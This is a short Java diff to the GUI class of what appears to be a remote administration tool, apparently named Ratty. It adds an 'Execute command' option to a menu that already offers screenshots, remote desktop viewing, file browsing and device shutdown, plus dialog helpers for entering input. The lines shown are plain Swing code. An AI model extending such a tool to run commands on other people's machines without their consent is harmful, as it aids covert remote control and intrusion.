@@ -8,8 +8,10 @@ import java.awt.event.MouseEvent;
 import java.awt.image.BufferedImage;
 
 import javax.swing.ImageIcon;
+import javax.swing.JDialog;
 import javax.swing.JFrame;
 import javax.swing.JMenuItem;
+import javax.swing.JOptionPane;
 import javax.swing.JPopupMenu;
 import javax.swing.JScrollPane;
 import javax.swing.JTable;
@@ -50,6 +52,7 @@ public final class RattyGui {
 	public static final String SCREENSHOT = "Take screenshot";
 	public static final String DESKTOP = "View desktop";
 	public static final String FILES = "Browse files";
+	public static final String COMMAND = "Execute command";
 	public static final String SHUTDOWN = "Shutdown device";
 	public static final String FREE = "Free client";
 	public static final String[] ACTION_COMMANDS = {
@@ -57,6 +60,7 @@ public final class RattyGui {
 		SCREENSHOT,
 		DESKTOP,
 		FILES,
+		COMMAND,
 		SHUTDOWN,
 		FREE
 	};
@@ -163,6 +167,20 @@ public final class RattyGui {
 	
 	public long getLastIdClicked() {
 		return lastIdClicked;
+	}
+	
+	public static void showMessage(final String message) {
+		final JOptionPane optionPane = new JOptionPane(message);
+		final JDialog dialog = optionPane.createDialog(null);
+		
+		dialog.setModal(false);
+		dialog.setVisible(true);
+	}
+	
+	public static String getInput() {
+		final String input = JOptionPane.showInputDialog(null);
+		
+		return input;
 	}
 	
 }
